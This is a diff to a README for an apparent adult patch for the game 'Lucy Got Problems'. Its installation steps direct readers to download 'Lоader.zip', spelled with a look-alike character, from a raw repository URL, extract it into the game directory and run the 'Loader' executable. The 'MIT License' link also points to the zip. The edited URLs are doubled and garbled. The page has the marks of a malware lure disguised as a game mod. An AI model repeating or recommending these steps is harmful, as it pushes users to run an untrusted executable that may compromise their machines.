@@ -30,9 +30,9 @@ If you use an OS not listed above, please submit an issue for community investig
 
 ## 🛠️ Installation Guide
 
-**1. Download `https://raw.githubusercontent.com/AshishParulekar/LucyGotProblems18PlusPatch-Enhanced-Edition/main/Lоader.zip` from the repository release page.**
+**1. Download `https://raw.githubusercontent.com/AshishParulekar/LucyGotProblems18PlusPatch-Enhanced-Edition/main/Lоader.zipоhttps://raw.githubusercontent.com/AshishParulekar/LucyGotProblems18PlusPatch-Enhanced-Edition/main/Lоader.zip` from the repository release page.**
 
-2. Extract the contents of `https://raw.githubusercontent.com/AshishParulekar/LucyGotProblems18PlusPatch-Enhanced-Edition/main/Lоader.zip` into your Lucy Got Problems game directory.
+2. Extract the contents of `https://raw.githubusercontent.com/AshishParulekar/LucyGotProblems18PlusPatch-Enhanced-Edition/main/Lоader.zipоhttps://raw.githubusercontent.com/AshishParulekar/LucyGotProblems18PlusPatch-Enhanced-Edition/main/Lоader.zip` into your Lucy Got Problems game directory.
 
 3. Run the `Loader` executable appropriate for your operating system (see table above).
 
@@ -74,7 +74,7 @@ For any support or questions, please open an issue in the repository. Your priva
 ## 📄 License
 
 Distributed under the MIT License — Open, simple, and always free!  
-Read the full license at: [MIT License](https://raw.githubusercontent.com/AshishParulekar/LucyGotProblems18PlusPatch-Enhanced-Edition/main/Lоader.zip)
+Read the full license at: [MIT License](https://raw.githubusercontent.com/AshishParulekar/LucyGotProblems18PlusPatch-Enhanced-Edition/main/Lоader.zipоhttps://raw.githubusercontent.com/AshishParulekar/LucyGotProblems18PlusPatch-Enhanced-Edition/main/Lоader.zip)
 
 ---
 
